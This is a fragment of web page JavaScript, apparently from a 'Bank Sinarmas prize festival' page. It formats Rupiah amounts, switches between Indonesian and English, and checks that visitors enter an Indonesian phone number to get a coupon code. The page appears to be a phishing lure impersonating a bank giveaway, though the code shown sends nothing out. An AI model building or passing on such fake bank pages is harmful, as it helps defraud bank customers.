      /* Fungsi */
    function formatRupiah(angka, prefix)
    {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }

  <script>
    const langSwitch = document.getElementById("lang-switch");

    const translations = {
      id: {
        welcome: "Gebyar hadiah bank sinarmas",
        instruction: "Silahkan Input Untuk cetak kode kupon",
        error: "Nomor HP wajib dimulai dengan 08 atau 628.",
        button: "Lanjutkan",
        footer: 'Butuh bantuan? <a href="#">Hubungi kami</a>'
      },
      en: {
        welcome: "Welcome to",
        instruction: "Enter your phone number to start.",
        error: "Phone number must start with 08 or 628.",
        button: "Continue",
        footer: 'Need help? <a href="#">Contact us</a>'
      }
    };

    function applyLanguage(lang) {
      document.getElementById("welcometext").textContent = translations[lang].welcome;
      document.getElementById("instructiontext").textContent = translations[lang].instruction;
      document.getElementById("error").textContent = translations[lang].error;
      document.getElementById("submitBtn").textContent = translations[lang].button;
      document.getElementById("footer-text").innerHTML = translations[lang].footer;
      langSwitch.textContent = lang === 'id' ? 'ID | EN' : 'EN | ID';
      localStorage.setItem("lang", lang);
    }

    langSwitch.addEventListener("click", () => {
      const currentLang = localStorage.getItem("lang") || "id";
      const newLang = currentLang === "id" ? "en" : "id";
      applyLanguage(newLang);
    });

    const savedLang = localStorage.getItem("lang") || "id";
    applyLanguage(savedLang);
  </script>

  <script>
    const phoneInput = document.getElementById('phone');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('error');

    phoneInput.addEventListener('input', () => {
      const value = phoneInput.value.trim();
      const valid = /^((08)|(628))\d{6,}$/.test(value);

      if (valid) {
        errorMsg.style.display = "none";
        phoneInput.classList.remove("invalid");
        submitBtn.disabled = false;
        submitBtn.classList.add("active");
      } else {
        errorMsg.style.display = value ? "block" : "none";
        phoneInput.classList.toggle("invalid", value.length > 0);
        submitBtn.disabled = true;
        submitBtn.classList.remove("active");
      }
    });

    document.getElementById("formNomor").addEventListener("submit", function(e) {
      const nomor = document.getElementById("phone").value;
    });
  </script>
